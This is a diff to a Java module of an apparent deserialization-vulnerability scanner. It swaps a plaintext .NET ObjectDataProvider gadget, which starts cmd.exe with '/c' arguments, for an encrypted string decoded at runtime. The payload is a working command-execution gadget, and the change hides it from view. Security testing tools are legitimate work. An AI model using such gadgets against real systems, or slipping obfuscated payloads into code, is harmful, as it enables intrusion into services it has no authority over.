@@ -29,8 +29,8 @@ import java.util.regex.Pattern;
  **********************************************************/
 public class DataContractJsonSerializerModule extends FreddyModuleBase {
     //ObjectDataProvider payload data
-    private static final String OBJD_PREFIX = "{\"__type\":\"ObjectDataProvider:#System.Windows.Data\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"__type\":\"Process:#System.Diagnostics\",\"__identity\":\"\",\"StartInfo\":{\"__type\":\"ProcessStartInfo:#System.Diagnostics\",\"FileName\":\"cmd.exe\",\"Arguments\":\"/c ";
-    private static final String OBJD_SUFFIX = "\"}}}";
+    private final String OBJD_PREFIX = decrypt("tW93zth10huB5E2bklWhiKS+dq1e4QYsRCTTkX8N8EP1EsViGez81GxSN1HFIKdhl3mly8U2H0WSoKCs7Yt95FR13o2MU98Xh1dKMtzAKHGpGgHgWDBQrIZLzcw+onbAOS27gEfJdumPWXIjMCZ/o8NGE/L3jIvIqs8r4a3sSqjC4amxZ4jKNI+BPssh6Ksw1K1OBIiJykOo/ENKHov9+I48PXIMiy80jpmoAuLShAA6wO8xmAG/3PX7naAtF51S08y+u1OrWEPVnQsxRyQsf/rY8TMulcX2GYG+4fhWBW/3j4bn39DpaeI5w21dmc10Rd0NkaK1iXKsBqk4g0Ad7A==");
+    private final String OBJD_SUFFIX = decrypt("HIvdW/5p/8WusoBXU5ZGFQ==");
 
     protected void initialiseModule() {
         setName("DataContractJsonSerializer");
